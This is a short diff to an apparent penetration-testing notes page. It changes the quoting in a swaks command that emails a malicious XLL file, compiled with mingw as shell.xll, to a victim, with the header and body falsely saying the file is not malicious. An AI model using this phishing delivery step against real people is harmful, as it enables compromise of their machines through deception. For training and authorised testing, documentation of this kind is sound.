@@ -70,7 +70,7 @@ x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
 #### 2. Send email with the malicious xll file
 
 ```console
-swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
+swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'This is not a malicious file' --attach '@shell.xll'
 ```
 
 <small>*Ref: [revshells.com](https://www.revshells.com/)*</small>
